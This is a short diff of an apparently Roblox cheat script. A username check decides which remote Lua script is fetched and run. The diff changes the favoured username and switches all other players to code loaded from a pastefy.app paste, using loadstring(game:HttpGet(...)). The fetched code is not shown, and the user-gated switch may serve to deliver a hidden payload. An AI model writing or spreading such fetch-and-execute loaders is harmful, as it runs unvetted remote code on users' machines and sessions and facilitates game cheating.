@@ -110,8 +110,8 @@ screenGui:Destroy()
 ---------------------------------------------------------
 -- USERNAME CHECK AND EXECUTION
 ---------------------------------------------------------
-if player.Name == "williampmaco2" then
+if player.Name == "playsafe_kurt" then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/x100Luck.lua"))()
 else
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SCRIPTER65/REDZ-HUB/refs/heads/main/Lucky%20100x"))()
+loadstring(game:HttpGet("https://pastefy.app/LaEfrAu7/raw", true))()
 end
